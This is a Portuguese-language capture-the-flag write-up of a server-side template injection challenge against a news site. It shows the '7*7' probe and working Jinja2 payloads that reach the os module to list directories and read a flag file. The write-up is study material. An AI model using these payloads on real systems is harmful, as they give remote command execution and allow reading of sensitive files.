# Sk1ttl3 News Network
###### Solved by @Mayaracar2
> This is a CTF about SSTI,Web Exploitation
##Sk1ttl3 News Network
### Introdução
O desafio consistia na exploração de uma vulnerabilidade de Server-Side Template Injection (SSTI) em um site responsável por armazenar e exibir conteúdos de um jornal. O objetivo era identificar a falha na aplicação e explorá-la para obter acesso a informações sensíveis armazenadas no servidor.
### Análise Inicial
Durante a fase de reconhecimento, foi realizado o teste clássico de SSTI utilizando a expressão:

<img width="749" height="504" alt="image" src="https://github.com/user-attachments/assets/91f3b592-d158-4183-8753-b44f996be8c3" />

Como resultado, o valor 49 foi exibido na tela. Isso confirmou que o mecanismo de template estava processando expressões diretamente no lado do servidor, evidenciando a presença de uma vulnerabilidade de SSTI.

Essa resposta demonstrou que era possível executar código dentro do contexto do template, abrindo caminho para uma exploração mais aprofundada.
### Exploração
Com a vulnerabilidade confirmada, iniciou-se a etapa de exploração visando obter execução de comandos no sistema operacional.

Foi utilizado o seguinte payload:

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
```

Esse comando é útil em cenários onde o acesso direto ao `cycler` pode estar bloqueado. Ele explora o contexto interno do template para alcançar o módulo `os` e executar comandos do sistema.

<img width="565" height="430" alt="image" src="https://github.com/user-attachments/assets/17b813e9-54e2-445a-a280-3d6b520e96f9" />

A execução do comando `ls` revelou a existência de um diretório suspeito chamado:

```bash
secrets777666
```
Em seguida, foi utilizado o seguinte payload para listar o conteúdo da pasta:

```bash
{{ cycler.__init__.__globals__.os.listdir('secrets777666') }}
```
O resultado indicou a presença de um arquivo chamado:

```bash
flag.txt
```

<img width="582" height="405" alt="image" src="https://github.com/user-attachments/assets/3c507fca-ea72-4b2b-b704-26628fc89953" />

Por fim, para realizar a leitura do arquivo e capturar a flag, foi utilizado o comando:

`{{ cycler.__init__.__globals__.os.popen('cat secrets777666/flag.txt').read() }}`

A execução desse payload retornou o conteúdo do arquivo flag.txt, concluindo com sucesso a exploração do desafio.

<img width="556" height="407" alt="image" src="https://github.com/user-attachments/assets/2680325b-3a82-4ea4-ab0d-9c03a2f9424a" />

### Conclusão
O desafio demonstrou de forma prática o impacto crítico de vulnerabilidades de SSTI quando não há validação ou sanitização adequada das entradas do usuário. A possibilidade de executar expressões dentro do template permitiu a escalada para execução remota de comandos (RCE), culminando no acesso a arquivos sensíveis do sistema.
 

